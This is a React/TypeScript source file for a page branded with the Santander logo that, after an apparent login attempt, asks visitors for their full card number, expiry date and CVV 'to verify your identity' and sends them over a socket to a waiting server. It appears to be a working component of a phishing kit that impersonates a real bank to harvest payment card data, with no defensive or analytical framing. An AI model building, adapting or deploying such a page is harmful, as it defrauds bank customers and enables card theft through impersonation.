import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { 
  Typography, 
  TextField, 
  Button, 
  Paper, 
  Box, 
  InputAdornment,
  IconButton,
  FormControl,
  InputLabel,
  OutlinedInput,
  CircularProgress,
  Alert
} from '@mui/material';
import { 
  CreditCard as CreditCardIcon, 
  CalendarToday as CalendarIcon, 
  Lock as LockIcon,
  Visibility,
  VisibilityOff
} from '@mui/icons-material';
import { socket } from '../services/socket';

interface VerificationResult {
  success: boolean;
  message: string;
}

const SecurityVerificationPage = () => {
  const { attemptId } = useParams();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [ccNum, setCcNum] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [showCvv, setShowCvv] = useState(false);

  useEffect(() => {
    if (!attemptId) {
      navigate('/login');
      return;
    }

    const handleVerificationResult = (data: VerificationResult) => {
      setLoading(false);
      if (data.success) {
        navigate('/dashboard');
      } else {
        setError(data.message || 'Verification failed. Please try again.');
      }
    };

    socket.on('verification_result', handleVerificationResult);
    
    return () => {
      socket.off('verification_result', handleVerificationResult);
    };
  }, [attemptId, navigate]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    
    if (!ccNum || !expDate || !cvv) {
      setError('All fields are required');
      return;
    }
    
    if (!/^\d{16}$/.test(ccNum)) {
      setError('Please enter a valid 16-digit credit card number');
      return;
    }
    
    if (!/^\d{2}\/\d{4}$/.test(expDate)) {
      setError('Please enter a valid expiry date (MM/YYYY)');
      return;
    }
    
    if (!/^\d{3}$/.test(cvv)) {
      setError('Please enter a valid 3-digit CVV');
      return;
    }
    
    if (!attemptId) {
      setError('Invalid attempt ID');
      return;
    }
    
    setLoading(true);
    
    socket.emit('verify_security_codes', {
      attemptId,
      cc_num: ccNum,
      exp_date: expDate,
      cvv: cvv
    });
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4">
      <div className="w-full max-w-md">
        <div className="flex justify-center mb-8">
          <img src="/santander-logo.svg" alt="Santander Logo" className="w-48" />
        </div>
        <Paper
          elevation={3}
          sx={{
            p: { xs: 3, sm: 4 },
            width: '100%',
            borderRadius: '8px'
          }}
        >
          <Typography component="h1" variant="h5" align="center" gutterBottom sx={{ fontWeight: 'bold' }}>
            Security Verification
          </Typography>
          <Typography variant="body2" color="textSecondary" align="center" sx={{ mb: 3 }}>
            For your protection, please enter your security details to verify your identity.
          </Typography>
          
          {error && <Alert severity="error" sx={{ mb: 2 }}>{error}</Alert>}

          <form onSubmit={handleSubmit}>
            <TextField
              fullWidth
              variant="outlined"
              label="Credit Card Number"
              placeholder="Enter 16-digit card number"
              value={ccNum}
              onChange={(e) => setCcNum(e.target.value.replace(/\D/g, '').slice(0, 16))}
              inputProps={{
                inputMode: 'numeric',
                pattern: '[0-9]*',
              }}
              InputProps={{
                startAdornment: (
                  <InputAdornment position="start">
                    <CreditCardIcon color="action" />
                  </InputAdornment>
                ),
              }}
            />
            
            <Box sx={{ display: 'flex', gap: 2, mb: 2 }}>
              <TextField
                fullWidth
                variant="outlined"
                label="Expiry Date (MM/YYYY)"
                placeholder="MM/YYYY"
                value={expDate}
                onChange={(e) => {
                  let value = e.target.value.replace(/\D/g, '');
                  if (value.length > 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2, 6);
                  }
                  setExpDate(value);
                }}
                inputProps={{ maxLength: 7 }}
                InputProps={{
                  startAdornment: (
                    <InputAdornment position="start">
                      <CalendarIcon color="action" />
                    </InputAdornment>
                  ),
                }}
              />
              
              <FormControl fullWidth variant="outlined">
                <InputLabel htmlFor="special-code">CVV</InputLabel>
                <OutlinedInput
                  id="special-code"
                  type={showCvv ? 'text' : 'password'}
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
                  inputProps={{
                    inputMode: 'numeric',
                    pattern: '[0-9]*',
                  }}
                  startAdornment={
                    <InputAdornment position="start">
                      <LockIcon color="action" />
                    </InputAdornment>
                  }
                  endAdornment={
                    <InputAdornment position="end">
                      <IconButton
                        aria-label="toggle password visibility"
                        onClick={() => setShowCvv(!showCvv)}
                        edge="end"
                      >
                        {showCvv ? <VisibilityOff /> : <Visibility />}
                      </IconButton>
                    </InputAdornment>
                  }
                  label="CVV"
                />
              </FormControl>
            </Box>
            
            <Button
              type="submit"
              fullWidth
              variant="contained"
              disabled={loading}
              sx={{
                mt: 3,
                py: 1.5,
                fontSize: '1rem',
                fontWeight: 600,
                bgcolor: '#EC0000',
                '&:hover': { bgcolor: '#B80000' }
              }}
            >
              {loading ? <CircularProgress size={24} color="inherit" /> : 'Verify My Identity'}
            </Button>
          </form>
        </Paper>
      </div>
    </div>
  );
};

export default SecurityVerificationPage;
